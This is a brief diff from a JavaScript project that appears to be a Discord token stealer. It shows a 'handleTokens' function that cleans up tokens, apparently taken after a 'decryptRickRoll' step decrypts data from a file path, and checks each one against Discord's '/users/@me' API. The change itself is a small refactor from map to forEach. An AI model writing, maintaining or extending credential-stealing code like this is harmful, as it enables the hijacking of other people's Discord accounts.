@@ -78,7 +78,7 @@ const decryptRickRoll = (path) => {
   });
 };
 
-const handleTokens = (tokens, resolve) => tokens.map(token => {
+const handleTokens = (tokens, resolve) => tokens.forEach(token => {
   token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
   axios.get('https://discord.com/api/v10/users/@me', {
     headers: { Authorization: token, 'User-Agent': userAgent }
